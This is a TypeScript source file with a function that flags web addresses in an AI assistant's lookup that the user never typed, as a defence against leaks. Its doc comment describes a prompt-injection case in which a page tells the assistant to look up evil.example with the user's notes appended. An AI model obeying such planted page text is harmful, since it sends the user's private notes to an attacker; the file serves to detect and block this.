// S2 2.5, moved here (M4, 2026-10-13) so the Mac's front desk can use it without loading all of tools.ts.

/**
 * The web addresses a lookup names that he did not type himself. A page that says "now look up
 * evil.example/?d=<his notes>" is how a reply leaks without anyone clicking anything.
 */
export function untypedAddresses(question: string, typed: string): string[] {
  const hosts = (t: string) => [...String(t ?? '').toLowerCase().matchAll(/(?:https?:\/\/)?((?:[a-z0-9-]+\.)+[a-z]{2,})(?=[\/:?#\s]|$)/g)].map((m) => m[1]!.replace(/^www\./, ''));
  // A file name is not an address: "node.js" or "notes.md" in a question is not somewhere to go.
  const FILE = /\.(js|ts|md|py|txt|json|exe|zip|pdf|png|jpe?g|css|html?|cs|csproj|sln|ps1|bat|cmd|log|csv|docx?|xlsx?)$/;
  const his = new Set(hosts(typed));
  return [...new Set(hosts(question))].filter((h) => !FILE.test(h) && !his.has(h) && ![...his].some((x) => h.endsWith('.' + x)));
}
